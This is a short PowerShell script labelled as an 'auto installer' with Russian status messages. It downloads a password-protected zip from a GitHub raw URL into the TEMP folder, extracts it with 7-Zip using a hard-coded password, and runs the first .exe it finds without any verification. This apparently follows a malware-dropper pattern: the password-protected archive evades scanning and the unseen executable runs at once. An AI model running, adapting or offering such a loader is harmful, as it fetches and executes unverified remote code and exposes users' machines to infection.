# =============================================
# Auto Installer by v25888656-maker
# =============================================

$Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip"
$Password = "5357"

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath  = "$env:TEMP\check_extracted"

Write-Host "[+] Скачиваем архив..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing

Write-Host "[+] Распаковываем с паролем..." -ForegroundColor Cyan
$7z = "C:\Program Files\7-Zip\7z.exe"
& $7z x "$DownloadPath" -o"$ExtractPath" -p"$Password" -y -bso0

# Автоматический поиск и запуск .exe файла
$ExeFiles = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($ExeFiles) {
    Write-Host "[+] Найден файл: $($ExeFiles.Name)" -ForegroundColor Green
    Write-Host "[+] Запускаем..." -ForegroundColor Green
    Start-Process $ExeFiles.FullName
} else {
    Write-Host "[-] .exe файл не найден!" -ForegroundColor Red
    explorer $ExtractPath
}

Write-Host "[+] Готово!" -ForegroundColor Green
